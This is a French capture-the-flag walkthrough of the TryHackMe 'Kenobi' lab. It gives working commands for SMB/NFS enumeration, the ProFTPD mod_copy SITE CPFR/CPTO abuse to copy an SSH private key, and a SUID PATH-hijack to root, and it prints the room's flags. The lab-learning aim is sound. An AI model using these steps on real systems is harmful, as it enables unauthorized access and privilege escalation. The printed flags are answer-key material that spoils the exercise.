# TryHackMe: Kenobi

**Objectif :** enumerer les services SMB, FTP et NFS exposes, exploiter le module `mod_copy` de ProFTPD pour recuperer la cle SSH de l'utilisateur `kenobi`, obtenir un acces initial au systeme, puis elever les privileges via un binaire SUID vulnerable a une manipulation de `PATH`.

---

## Introduction

La room **Kenobi** est une machine Linux tres pedagogique parce qu'elle assemble plusieurs briques simples en une vraie chaine d'attaque :

- enumeration SMB
- lecture d'un fichier de log utile
- enumeration NFS
- abus de ProFTPD `mod_copy`
- pivot SSH avec une cle privee
- privilege escalation via SUID et `PATH hijacking`

Elle est guidee, mais elle reste parfaite pour apprendre a faire le lien entre plusieurs services reseau.

---

## Task 1: Deploy the vulnerable machine

### Question 1: Make sure you're connected to our network and deploy the machine

Je deploie la cible depuis la room et j'attends qu'elle soit reachable.

### Reponse

`Done`

### Question 2: Scan the machine with nmap, how many ports are open?

Je lance un scan Nmap standard :

```bash
nmap -sC -sV <IP>
```

Je retrouve **7 ports ouverts** :

- `21/tcp` - FTP
- `22/tcp` - SSH
- `80/tcp` - HTTP
- `111/tcp` - rpcbind
- `139/tcp` - NetBIOS
- `445/tcp` - SMB
- `2049/tcp` - NFS

### Reponse

**How many ports are open?** `7`

---

## Task 2: Enumerating Samba for shares

### Question 1: Using the nmap command above, how many shares have been found?

Je suis la methode proposee par la room :

```bash
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse <IP>
```

Le script SMB remonte **3 shares** :

- `anonymous`
- `print$`
- `IPC$`

### Reponse

**How many shares have been found?** `3`

### Question 2: Using your machine, connect to the machines network share. Once you're connected, list the files on the share. What is the file can you see?

Je me connecte sur le share anonyme :

```bash
smbclient //<IP>/anonymous
```

Puis :

```bash
ls
```

Le fichier visible est :

```text
log.txt
```

### Reponse

**File on the share:** `log.txt`

### Question 3: What port is FTP running on?

En lisant `log.txt`, on retrouve des informations de configuration sur ProFTPD. Le port mentionne est le port standard :

```text
21
```

### Reponse

**FTP port:** `21`

### Question 4: What mount can we see?

La room enchaine ensuite sur l'enumeration NFS :

```bash
nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount <IP>
```

Le montage exporte par la machine est :

```text
/var
```

### Reponse

**Visible mount:** `/var`

---

## Ce qu'apporte log.txt

Le fichier `log.txt` n'est pas un simple decor. Il fournit deux informations essentielles :

1. des details sur le service ProFTPD
2. des informations sur l'utilisateur `kenobi` et la generation de sa cle SSH

Autrement dit, la room nous oriente deja vers un croisement entre FTP et SSH. Ce fichier sert de pont logique vers la suite.

---

## Task 3: Gain initial access with ProFtpd

### Question 1: Lets get the version of ProFtpd. Use netcat to connect to the machine on the FTP port. What is the version?

Je me connecte avec netcat :

```bash
nc <IP> 21
```

La banniere donne :

```text
ProFTPD 1.3.5
```

### Reponse

**ProFTPD version:** `1.3.5`

### Question 2: We can use searchsploit to find exploits for a particular software version. How many exploits are there for the ProFTPd running?

Je lance :

```bash
searchsploit proftpd 1.3.5
```

Il existe une petite divergence selon la base Exploit-DB et la machine utilisee : on peut parfois obtenir `3`, mais la bonne reponse ici reste `4`.

### Reponse

**How many exploits are there?** `4`

### Question 3: You should have found an exploit from ProFtpd's mod_copy module.

Pas de valeur a soumettre ici, mais c'est l'etape cle de l'exploitation.

Le module `mod_copy` expose les commandes FTP :

- `SITE CPFR`
- `SITE CPTO`

Elles permettent de copier des fichiers du systeme sans authentification si le module est vulnérable.

### Reponse

`Done`

### Question 4: We're now going to copy Kenobi's private key using SITE CPFR and SITE CPTO commands.

L'enchainement a suivre est le suivant :

```bash
nc <IP> 21
SITE CPFR /home/kenobi/.ssh/id_rsa
SITE CPTO /var/tmp/id_rsa
```

Le raisonnement est elegant :

- on sait qu'il existe une cle privee pour `kenobi`
- on sait que `/var` est exporte via NFS
- on peut donc copier la cle dans `/var/tmp`
- ensuite, il suffit de monter l'export NFS pour la recuperer

### Reponse

`Done`

### Recuperation de la cle via NFS

Je cree un point de montage local :

```bash
mkdir /mnt/kenobiNFS
sudo mount <IP>:/var /mnt/kenobiNFS
```

Je recupere ensuite la cle :

```bash
cp /mnt/kenobiNFS/tmp/id_rsa .
chmod 600 id_rsa
```

Puis je me connecte en SSH :

```bash
ssh -i id_rsa kenobi@<IP>
```

### Question 5: What is Kenobi's user flag (/home/kenobi/user.txt)?

Une fois connecte en tant que `kenobi`, je lis le flag utilisateur :

```bash
cat /home/kenobi/user.txt
```

### Reponse

**Kenobi's user flag:** `d0b0f3f53b6caa532a83915e19224899`

---

## Task 4: Privilege Escalation with Path Variable Manipulation

### Question 1: What file looks particularly out of the ordinary?

Je cherche les binaires SUID :

```bash
find / -perm -u=s -type f 2>/dev/null
```

L'element le plus inhabituel est :

```text
/usr/bin/menu
```

### Reponse

**Out-of-the-ordinary file:** `/usr/bin/menu`

### Question 2: Run the binary, how many options appear?

J'execute le programme :

```bash
/usr/bin/menu
```

Le menu affiche **3 options**.

### Reponse

**How many options appear?** `3`

---

## Analyse du binaire /usr/bin/menu

La room suggere d'utiliser `strings` :

```bash
strings /usr/bin/menu
```

Le binaire appelle notamment :

- `curl -I localhost`
- `uname -r`
- `ifconfig`

Le detail important est que certaines commandes sont appelees **sans chemin absolu**. Comme le binaire est SUID root, cela ouvre la voie a une manipulation de la variable `PATH`.

---

## Privilege Escalation: PATH Hijacking

Je prepare un faux `curl` dans `/tmp` :

```bash
cd /tmp
echo /bin/sh > curl
chmod 777 curl
export PATH=/tmp:$PATH
```

Ensuite, je relance :

```bash
/usr/bin/menu
```

Et je choisis l'option `1`, celle qui effectue le "status check" a l'aide de `curl`.

Comme le binaire root cherche `curl` dans mon `PATH`, il execute en realite mon faux fichier, qui invoque `/bin/sh`. J'obtiens ainsi un shell root.

Je confirme :

```bash
whoami
id
```

Puis je lis le dernier flag :

```bash
cat /root/root.txt
```

### Question 3: What is the root flag (/root/root.txt)?

### Reponse

**root flag:** `177b3cd8562289f37382721c28381f02`

---

## Resume des reponses de la room

- Make sure you're connected to our network and deploy the machine `Done`
- Scan the machine with nmap, how many ports are open? `7`
- Using the nmap command above, how many shares have been found? `3`
- Once you're connected, list the files on the share. What is the file can you see? `log.txt`
- What port is FTP running on? `21`
- What mount can we see? `/var`
- What is the version? `1.3.5`
- How many exploits are there for the ProFTPd running? `4`
- You should have found an exploit from ProFtpd's mod_copy module `Done`
- We're now going to copy Kenobi's private key using SITE CPFR and SITE CPTO commands `Done`
- What is Kenobi's user flag? `d0b0f3f53b6caa532a83915e19224899`
- What file looks particularly out of the ordinary? `/usr/bin/menu`
- Run the binary, how many options appear? `3`
- What is the root flag? `177b3cd8562289f37382721c28381f02`

---

## Commandes importantes

### Scan initial

```bash
nmap -sC -sV <IP>
```

Montre les services FTP, SMB, RPC, NFS et SSH qui composeront toute la chaine d'attaque.

### Enumeration SMB

```bash
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse <IP>
smbclient //<IP>/anonymous
```

Permet de recuperer `log.txt`.

### Enumeration NFS

```bash
nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount <IP>
```

Fait apparaitre le montage `/var`.

### Abus de mod_copy

```bash
SITE CPFR /home/kenobi/.ssh/id_rsa
SITE CPTO /var/tmp/id_rsa
```

Copie la cle privee SSH vers un emplacement exporte en NFS.

### Montage NFS

```bash
sudo mount <IP>:/var /mnt/kenobiNFS
```

Permet de recuperer physiquement la cle `id_rsa`.

### PATH hijacking

```bash
echo /bin/sh > /tmp/curl
chmod 777 /tmp/curl
export PATH=/tmp:$PATH
/usr/bin/menu
```

Transforme un SUID mal concu en shell root.

---

## Raisonnement pas a pas

La force de **Kenobi**, c'est la coherence des etapes :

1. SMB donne un fichier de log
2. le log parle de ProFTPD et de `kenobi`
3. NFS revele un export accessible
4. ProFTPD permet de copier la cle SSH dans cet export
5. la cle donne l'acces initial en SSH
6. un binaire SUID mal ecrit ouvre la voie a `PATH`
7. le PATH hijacking donne root

Chaque service compte. Aucun n'est purement decoratif.

---

## Conclusion

**Kenobi** reste une tres bonne machine d'apprentissage, parce qu'elle force a relier plusieurs protocoles au lieu de se focaliser sur une seule faille. C'est exactement le type de room qui fait progresser la methode autant que la technique.

***Auteur*** *: Saad Idrissi*
